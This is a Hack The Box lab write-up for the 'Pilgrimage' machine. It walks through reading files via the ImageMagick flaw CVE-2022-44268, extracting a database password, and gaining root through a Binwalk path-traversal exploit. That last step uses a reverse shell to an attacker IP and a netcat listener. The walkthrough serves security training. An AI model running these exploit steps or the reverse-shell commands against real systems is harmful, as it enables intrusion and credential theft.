---
title: "Pilgrimage"
platform: hackthebox
difficulty: Easy
os: Linux
machine: Pilgrimage
date: 2026-01-10
tags: [web, cve, imagemagick, file-inclusion]
excerpt: "Exploiting ImageMagick arbitrary file read (CVE-2022-44268) to extract credentials, then abusing Binwalk RCE for root."
---

## Reconnaissance

Starting with a full port scan:

```bash
nmap -sC -sV -oN nmap/pilgrimage 10.10.11.219
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian
80/tcp open  http    nginx 1.18.0
```

The web application is an image shrinking service hosted at `pilgrimage.htb`. Adding it to `/etc/hosts` and visiting the site reveals a simple upload form.

## Foothold — ImageMagick CVE-2022-44268

Inspecting the source and running `ffuf` for directory brute-forcing reveals a `.git` directory exposed on the server:

```bash
git-dumper http://pilgrimage.htb/.git ./git-dump
```

Analysing the source code, the application uses **ImageMagick 7.1.0-49**. This version is vulnerable to **CVE-2022-44268** — an arbitrary file read via crafted PNG `tEXt` profiles.

### Crafting the Payload

```bash
python3 generate.py -f /etc/passwd -o exploit.png
```

Upload the crafted image, download the resized output, and extract the embedded data:

```bash
identify -verbose output.png | grep -A 20 "Raw profile"
```

Decoding the hex gives us the contents of `/etc/passwd`, revealing a user `emily`.

### Reading the Database

Targeting the SQLite database found in the git source at `/var/db/pilgrimage`:

```bash
python3 generate.py -f /var/db/pilgrimage -o db_extract.png
```

Extracting credentials from the database dump: `emily:abigchonkyboi123`.

```bash
ssh emily@pilgrimage.htb
# password: abigchonkyboi123
cat ~/user.txt
```

**User flag captured.**

## Privilege Escalation — Binwalk RCE

Running `pspy64` to monitor processes reveals a root cron job executing a script that uses **Binwalk v2.3.2** to analyse uploaded files:

```bash
/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
/usr/local/bin/binwalk -e ...
```

Binwalk 2.3.2 is vulnerable to **CVE-2022-4510** — a path traversal leading to RCE by crafting a malicious PFS file.

```bash
python3 binwalk_exploit.py reverse_shell.png 10.10.14.5 9001
```

Upload the crafted image, trigger the cron, and catch the reverse shell:

```bash
nc -lvnp 9001
# root shell!
cat /root/root.txt
```

**Root flag captured.** ✅

## Key Takeaways

- Always check for exposed `.git` directories
- ImageMagick has a large attack surface — version fingerprinting is critical
- Cron jobs running as root with vulnerable binaries are low-hanging fruit for privesc
